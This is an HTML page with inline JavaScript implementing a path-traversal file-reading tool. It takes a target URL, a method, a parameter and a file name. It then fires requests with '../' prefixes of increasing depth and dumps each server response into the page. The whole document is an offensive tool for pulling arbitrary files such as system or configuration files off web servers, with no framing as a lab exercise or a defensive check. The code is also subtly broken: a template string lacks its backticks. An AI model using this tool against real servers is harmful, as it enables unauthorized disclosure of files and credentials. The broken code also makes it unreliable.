<html lang="en"> 
    <head> 
        <meta charset="UTF-8"> 
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>
        </title>
    </head>
    <body>
        <div style="display:flex;">
            <div style="width:50%">
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">URL</label>
                    <input style="width:100%;margin-block:4px;padding:4px" type="text" id="formurl">
                </div>
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">FORM METHOD</label>
                    <select style="width:100%;margin-block:4px;padding:4px" id="formmethod">
                        <option value="get">get</option>
                        <option value="post">post</option>
                    </select>
                </div>
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">FORM FIELD</label>
                    <input style="width:100%;margin-block:4px;padding:4px" type="text" id="formparam">
                </div>
                <div>
                    <label style="width:100%;margin-block:4px;padding:4px" for="">DUMP FILE</label>
                    <input style="width:100%;margin-block:4px;padding:4px" type="text" id="formdumpfile">
                </div>
                <div>
                    <button onclick='traverse()' style="width:100%;margin-block:4px;padding:4px">TEST</button>
                </div>
            </div>
            <div style="width:50%;overflow:scroll; padding:22px" id="render">
                <pre>
                </pre>
            </div>
        </div>
        <script> 
            const tests = [
                '../',
                '../../',
                '../../../',
                '../../../../',
                '../../../../../',
                '../../../../../../',
                '../../../../../../../',
                '../../../../../../../../',
                '../../../../../../../../../',
                '../../../../../../../../../../',
                '../../../../../../../../../../../',
                '../../../../../../../../../../../../',
                '../../../../../../../../../../../../../',
                '../../../../../../../../../../../../../../',
                '../../../../../../../../../../../../../../../',
                '../../../../../../../../../../../../../../../../',
                '/',
            ]
            const post = (req, data, cb) => {
                data = formdata(data) 
                req.onload = cb 
                req.send(data)
            }
            const get = (req, cb) => {
                req.onload = cb
                req.send()
            }
            const formdata = (data) => {
                let _formData = new FormData()
                Object.keys(data).map(key => {
                    _formData.append(key, data[key])
                })
                return _formData
            }
            const formparams = (data) => {
                let _formData = ""
                Object.keys(data).map(
                    (key, idx) => {
                        _formData += (idx > 0) ? "&" : "?"
                        _formData += `${key}=${data[key]}`
                    }
                )
                return _formData
            }
            const custom_req = (url) => {
                let _req = new XMLHttpRequest()
                return {
                    post: (data, cb) => {
                        _req.open('POST', url)
                        post(_req, data, cb)
                    },
                    get: (data, cb) => {
                        _req.open('GET', url + formparams(data))
                        get(_req, cb)
                    },
                    req: _req
                }
            }

            function elem(selector) 
            {
                return document.querySelector(selector)
            }

            function elems(selector) 
            {
                return document.querySelectorAll(selector)
            }

            function traverse() 
            {
                const url           = elem("#formurl").value ?? null
                const method        = elem("#formmethod").value ?? null
                let param           = elem("#formparam").value ?? null
                let filename        = elem("#formdumpfile").value ?? null
                injection(url,param,method,filename)
            }

            function injection(url, param, method, filename) 
            {
                if (url && method && param && filename) 
                {
                    const params    = {}
                    tests.map(
                        test=>{
                            params[param]   = `${test}${filename}`
                            const req = custom_req(url) 
                            req[method](params, res => {
                                elem("#render").innerHTML += <h2></h2><div>${req.req.response}</div>
                            })
                        }
                    )
                }
            }

            </script>
    </body>
</html>